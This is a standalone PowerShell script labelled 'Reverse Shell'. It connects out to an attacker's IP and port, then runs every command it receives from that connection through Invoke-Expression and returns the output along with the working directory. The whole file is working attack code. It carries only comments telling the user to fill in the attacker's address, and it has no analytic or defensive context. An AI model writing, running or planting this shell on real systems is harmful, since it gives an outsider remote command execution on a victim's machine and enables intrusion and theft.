# --------- Reverse Shell ---------
$ip = "192.168.0.102"     # Replace with attacker's IP
$port = 4444              # Replace with your listening port

$client = New-Object System.Net.Sockets.TcpClient($ip, $port)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$writer.AutoFlush = $true
$buffer = New-Object byte[] 1024

while (($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
    $data = (New-Object System.Text.ASCIIEncoding).GetString($buffer, 0, $i)
    try {
        $sendback = (iex $data 2>&1 | Out-String)
    } catch {
        $sendback = $_.Exception.Message
    }

    $sendback2 = "`n$sendback`nPWD: '" + (pwd).Path + "$#'"
    $sendBytes = [System.Text.Encoding]::ASCII.GetBytes($sendback2)
    $stream.Write($sendBytes, 0, $sendBytes.Length)
    $stream.Flush()
}
$client.Close()
